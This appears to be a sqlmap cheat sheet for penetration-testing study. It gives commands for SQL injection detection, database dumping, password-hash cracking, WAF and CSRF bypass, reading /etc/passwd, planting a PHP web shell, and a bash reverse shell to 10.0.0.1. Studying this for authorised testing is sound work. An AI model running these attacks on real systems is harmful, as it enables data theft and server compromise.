# **Supported Databases**

| `MySQL` | `Oracle` | `PostgreSQL` | `Microsoft SQL Server` |
| --- | --- | --- | --- |
| `SQLite` | `IBM DB2` | `Microsoft Access` | `Firebird` |
| `Sybase` | `SAP MaxDB` | `Informix` | `MariaDB` |
| `HSQLDB` | `CockroachDB` | `TiDB` | `MemSQL` |
| `H2` | `MonetDB` | `Apache Derby` | `Amazon Redshift` |
| `Vertica`, `Mckoi` | `Presto` | `Altibase` | `MimerSQL` |
| `CrateDB` | `Greenplum` | `Drizzle` | `Apache Ignite` |
| `Cubrid` | `InterSystems Cache` | `IRIS` | `eXtremeDB` |
| `FrontBase` |  |  |  |

# **Supported SQL Injection Types**

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

# Basic commands and usage

## Basic Listing

```sql
sqlmap -h
```

## Advanced Listing

```sql
sqlmap -hh
```

## Basic Usage

```sql
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

-u        : Used to provide the target URL
--batch   : Used for skipping any required user-input
```

## Dump database

```
sqlmap -u "http://www.example.com/vuln.php?id=1" --dump
```

# **Building Attacks**

## **Curl Commands**

Use `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools. By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`

```sql
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## **GET/POST Requests**

```
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

**Note:** `POST` parameters `uid` and `name` will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter `uid` is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using `-p uid`. Otherwise, we could mark it inside the provided data with the usage of special marker `*` as follows:

```
sqlmap 'http://www.example.com/' -p uid
```

## **Full HTTP Requests**

Capture a HTTP Request using BurpSuite and write it on a file

```bash
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0w
```

Then use:

```bash
sqlmap -r req.txt
```

Note: Similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=**'.

## **Custom SQLMap Requests**

### Specify a cookie

```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

**Note:** While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. `--cookie="id=1*"`)

```bash
sqlmap ... --cookie="id=1*"
```

### Specify a Header

```bash
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

**Note:** We can apply the same to options like `--host`, `--referer`, and `-A/--user-agent`, which are used to specify the same HTTP headers' values.

**Note 2:** There is a switch `--random-agent` designed to randomly select a `User-agent` header value from the included database of regular browser values

### Specify an alternative HTTP method

```bash
sqlmap -u www.target.com --data='id=1*' --method PUT
```

## **Custom HTTP Requests**

SQLMap also supports JSON formatted (e.g. `{"id":1}`) and XML formatted (e.g. `<element><id>1</id></element>`) HTTP requests.

```
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1*",                  #adding asterix to specific payload location
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

# Error Handling

## **Display Errors**

```
--parse-errors
```

## **Store the Traffic**

```
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

## **Verbose Output**

```
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

## **Using Proxy**

We can utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`).

# **Attack Tuning**

## **Prefix/Suffix**

*There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.*

```
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

## **Level/Risk**

- The option `-level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the
level).
- The option `-risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or
denial-of-service).

As for the number of payloads, by default (i.e. `--level=1 --risk=1`), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (`--level=5 --risk=3`) the number of payloads increases to 7,865.

# Database Enumeration

## **Basic DB Data Enumeration**

```
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

--baner        :  Database version banner
--current-user :  Current user name 
--current-db   :  Current database name 
--is-dba       :  Checking if the current user has DBA (administrator) rights 

```

## **Table Enumeration**

```
sqlmap -u "http://www.example.com/?id=1" --tables -D <DBName> 

...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

### Dumping a Table

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

**Note:** Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.

## **Table/Row Enumeration**

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

### start and stop

Specify the rows with the `--start` and `--stop` options 

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## **Conditional Enumeration**

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

# **Advanced Database Enumeration**

## **DB Schema Enumeration**

```
sqlmap -u "http://www.example.com/?id=1" --schema
```

## **Searching for Data**

We can search for databases, tables, and columns of interest, by using the `--search` option.

```
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

In this example, we are looking for all of the table names containing the keyword `user`.

```
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

Here, we are looking for all of the column names containing the keyword `pass`.

## **DB Users Password Enumeration and Cracking**

### Identify a table containing passwords

```
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

You can simplify the process using

```
sqlmap -u "http://www.example.com/?id=1" --passwords --batch -T users

do you want to crack them via a dictionary-based attack? [Y/n/q] y
[00:21:08] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[00:21:15] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[00:21:19] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[00:21:19] [INFO] starting 6 processes 
[00:21:19] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                       
[00:21:19] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                       
[00:21:19] [INFO] cracked password '1955chev' for hash 'aed6d83bab8d9234a97f18432cd9a85341527297'                                       
[00:21:19] [INFO] cracked password '3052' for hash '9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'   
```

# **Bypassing Web Application Protections**

## **Anti-CSRF Token Bypass**

```  
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

## **Unique Value Bypass**

```
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 
```

## **Calculated Parameter Bypass**

```
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 
```

## **WAF Bypass**

```
 --skip-waf
```

## **User-agent Blacklisting Bypass**

```
--random-agent
```

## **Tamper Scripts**

### List Tampers

```
--list-tampers 
```

### Tamper Scripts Usage

```
--tamper=between,randomcase, etc.
```

### Tamper List

| **Tamper-Script** | **Description** |
| --- | --- |
| `0eunion` | Replaces instances of  UNION with e0UNION |
| `base64encode` | Base64-encodes all characters in a given payload |
| `between` | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #` |
| `commalesslimit` | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart |
| `equaltolike` | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword |
| `modsecurityversioned` | Embraces complete query with (MySQL) versioned comment |
| `modsecurityzeroversioned` | Embraces complete query with (MySQL) zero-versioned comment |
| `percentage` | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T) |
| `plus2concat` | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart |
| `randomcase` | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt) |
| `space2comment` | Replaces space character ( ``) with comments `/ |
| `space2dash` | Replaces space character ( ``) with a dash comment (`--`) followed by a random string and a new line (`\n`) |
| `space2hash` | Replaces (MySQL) instances of space character ( ``) with a pound character (`#`) followed by a random string  and a new line (`\n`) |
| `space2mssqlblank` | Replaces (MsSQL) instances of space character ( ``) with a random blank character from a valid set of alternate characters |
| `space2plus` | Replaces space character ( ``) with plus (`+`) |
| `space2randomblank` | Replaces space character ( ``) with a random blank character from a valid set of alternate characters |
| `symboliclogical` | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `||`) |
| `versionedkeywords` | Encloses each non-function keyword with (MySQL) versioned comment |
| `versionedmorekeywords` | Encloses each keyword with (MySQL) versioned comment |

## **Miscellaneous Bypasses**

```
--chunked
```

# **OS Exploitation**

## **File Read**

### **Checking for DBA Privileges**

```
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

DBA privileges must be set to True to Read/Write Permissions in modern DBMS

### **Reading Local Files**

```
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

## File Write

### Writing a basic shell in a file

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Writing this file into victim Server

```
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

## **OS Command Execution**

```
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

If this command does not return any command result, we can specify another technique using:

```
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

If  you get a os shell, you can uprade your connection using

```powershell
os.shell>bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```
